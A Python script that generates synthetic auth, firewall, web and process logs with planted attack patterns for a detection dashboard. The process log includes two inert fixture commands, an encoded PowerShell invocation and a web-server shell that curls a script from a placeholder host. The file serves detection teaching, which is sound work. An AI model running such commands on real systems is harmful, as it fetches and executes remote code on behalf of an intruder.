"""Generate reproducible sample logs (auth / firewall / web / process) with embedded events.

Run `python -m threatscope.gen_data` to (re)write the bundled sample logs under
threatscope/data/. The attacks are deterministic so the dashboard always shows the
same incidents; benign noise surrounds them.
"""

from __future__ import annotations

import os
import random
from datetime import datetime, timedelta

DATA = os.path.join(os.path.dirname(__file__), "data")
BASE = datetime(2026, 3, 1, 9, 0, 0)
USERS = ["alice", "bob", "carol", "dave", "service-ci"]
INTERNAL = ["10.0.0.%d" % i for i in range(5, 40)]


def _ts(sec):
    return (BASE + timedelta(seconds=sec)).isoformat()


def gen_auth(rng):
    lines = []
    for i in range(200):                                    # benign
        sec = rng.randint(0, 7200)
        ok = rng.random() > 0.15
        lines.append("%s %s password for %s from %s" % (
            _ts(sec), "Accepted" if ok else "Failed", rng.choice(USERS), rng.choice(INTERNAL)))
    for i in range(16):                                     # brute force on alice
        lines.append("%s Failed password for alice from 203.0.113.9" % _ts(3600 + i * 5))
    # impossible travel for bob
    lines.append("%s Accepted password for bob from 10.0.0.12" % _ts(4000))
    lines.append("%s Accepted password for bob from 185.220.101.5" % _ts(4180))
    lines.sort()
    return lines


def gen_fw(rng):
    lines = []
    for i in range(300):                                    # benign
        lines.append("%s src=%s dst=10.0.0.1 dport=%d action=ALLOW" % (
            _ts(rng.randint(0, 7200)), rng.choice(INTERNAL), rng.choice([80, 443, 53, 22])))
    for p in range(20, 20 + 28):                            # port scan from one host
        lines.append("%s src=198.51.100.7 dst=10.0.0.1 dport=%d action=DENY" % (_ts(5000 + (p - 20)), p))
    lines.sort()
    return lines


def gen_web(rng):
    lines = []
    for i in range(250):                                    # benign
        lines.append('%s %s "GET /page%d" 200 %d' % (
            _ts(rng.randint(0, 7200)), rng.choice(INTERNAL), rng.randint(1, 50), rng.randint(500, 40000)))
    for i in range(30):                                     # large egress from one host
        lines.append('%s 10.0.0.23 "GET /export/dump%d.csv" 200 300000' % (_ts(5500 + i), i))
    lines.sort()
    return lines


def gen_process(rng):
    hosts = ["workstation-01", "build-runner-02", "web-01", "db-01"]
    users = ["alice", "bob", "carol", "service-ci"]
    lines = []
    for _ in range(90):
        host, user = rng.choice(hosts), rng.choice(users)
        process = rng.choice(["bash", "python", "node", "nginx"])
        parent = "systemd" if process != "nginx" else "systemd"
        command = {
            "bash": "bash -lc 'rotate logs'", "python": "python -m pytest",
            "node": "node worker.js", "nginx": "nginx -g daemon off;",
        }[process]
        lines.append(f'{_ts(rng.randint(0, 7200))} host={host} user={user} parent={parent} process={process} command="{command}"')
    # Deliberate, inert strings in the generated teaching fixture.
    lines.extend([
        f'{_ts(6100)} host=workstation-01 user=alice parent=bash process=powershell command="powershell -EncodedCommand RkFLRV9TQU1QTEU="',
        f'{_ts(6120)} host=web-01 user=www-data parent=nginx process=sh command="sh -c curl http://example.invalid/demo.sh"',
    ])
    lines.sort()
    return lines


def main():
    os.makedirs(DATA, exist_ok=True)
    rng = random.Random(1)
    for name, gen in [("auth.log", gen_auth), ("firewall.log", gen_fw),
                      ("web.log", gen_web), ("process.log", gen_process)]:
        with open(os.path.join(DATA, name), "w") as f:
            f.write("\n".join(gen(rng)) + "\n")
    print("wrote sample logs to", DATA)


if __name__ == "__main__":
    main()
